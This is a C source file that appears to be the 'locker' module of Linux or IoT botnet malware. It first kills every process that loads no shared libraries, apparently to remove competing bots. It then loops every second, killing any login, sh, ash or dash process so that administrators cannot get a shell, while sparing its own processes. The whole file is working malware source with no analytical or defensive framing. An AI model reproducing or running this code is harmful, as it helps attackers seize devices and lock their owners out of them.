#define _GNU_SOURCE

#include "headers/locker.h"
#include <ctype.h>
#include <dirent.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int is_pid(const char *s) {
    if (!*s) return 0;
    while (*s) {
        if (!isdigit((unsigned char)*s)) return 0;
        s++;
    }
    return 1;
}

/* true when /proc/<pid>/maps exists, is non-empty and has no ".so" line */
static int maps_without_so(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", (int)pid);
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char line[512];
    int any = 0;
    while (fgets(line, sizeof(line), f)) {
        any = 1;
        if (strstr(line, ".so")) {
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return any;
}

static int comm_is_locked(const char *comm) {
    return strcmp(comm, "login") == 0 || strcmp(comm, "ash") == 0 ||
           strcmp(comm, "sh") == 0 || strcmp(comm, "dash") == 0;
}

static int read_comm(pid_t pid, char *out, size_t n) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", (int)pid);
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    if (!fgets(out, (int)n, f)) {
        fclose(f);
        return -1;
    }
    fclose(f);
    size_t l = strlen(out);
    while (l > 0 && (out[l - 1] == '\n' || out[l - 1] == '\r' || out[l - 1] == ' ')) {
        out[--l] = '\0';
    }
    return 0;
}

static int same_exe(pid_t pid, const char *self) {
    char path[64], exe[512];
    snprintf(path, sizeof(path), "/proc/%d/exe", (int)pid);
    ssize_t l = readlink(path, exe, sizeof(exe) - 1);
    if (l <= 0) return 0;
    exe[l] = '\0';
    return strcmp(exe, self) == 0;
}

static pid_t proc_ppid(pid_t pid) {
    char path[64], buf[512];
    snprintf(path, sizeof(path), "/proc/%d/stat", (int)pid);
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    size_t n = fread(buf, 1, sizeof(buf) - 1, f);
    fclose(f);
    if (n == 0) return -1;
    buf[n] = '\0';
    char *close = strrchr(buf, ')');
    if (!close) return -1;
    return (pid_t)atoi(close + 2);
}

/* phase 1 (once): kill everything with maps but no .so.
   never us: not self, not same binary, not pid 1. */
static void sweep_once(void) {
    pid_t me = getpid();
    char self[512] = {0};
    ssize_t sl = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (sl > 0) self[sl] = '\0';
    DIR *d = opendir("/proc");
    if (!d) return;
    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (!is_pid(e->d_name)) continue;
        pid_t pid = (pid_t)atoi(e->d_name);
        if (pid <= 1 || pid == me) continue;
        if (sl > 0 && same_exe(pid, self)) continue;
        if (maps_without_so(pid)) kill(pid, SIGKILL);
    }
    closedir(d);
}

/* phase 2 (every 1s): lock login shells out.
   never us: not self, not our children (e.g. !shell jobs). */
static void lock_loop(void) {
    pid_t me = getpid();
    while (1) {
        DIR *d = opendir("/proc");
        if (d) {
            struct dirent *e;
            while ((e = readdir(d)) != NULL) {
                if (!is_pid(e->d_name)) continue;
                pid_t pid = (pid_t)atoi(e->d_name);
                if (pid <= 1 || pid == me) continue;
                if (proc_ppid(pid) == me) continue;
                char comm[64] = {0};
                if (read_comm(pid, comm, sizeof(comm)) == 0 && comm_is_locked(comm)) {
                    kill(pid, SIGKILL);
                }
            }
            closedir(d);
        }
        sleep(1);
    }
}

void locker_run(void) {
    sweep_once();
    lock_loop();
}

void *locker_thread(void *arg) {
    (void)arg;
    locker_run();
    return NULL;
}
